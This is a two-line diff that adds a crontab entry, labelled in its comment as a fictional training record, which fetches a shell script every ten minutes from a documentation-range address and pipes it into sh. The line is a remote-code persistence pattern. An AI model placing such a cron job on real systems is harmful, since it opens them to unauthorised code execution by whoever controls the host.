@@ -1,0 +1,2 @@
+# Fictional training record. 198.51.100.0/24 is an address range reserved for documentation examples, so it never actually connects.
+*/10 * * * * curl -fsS http://198.51.100.23/u.sh | sh
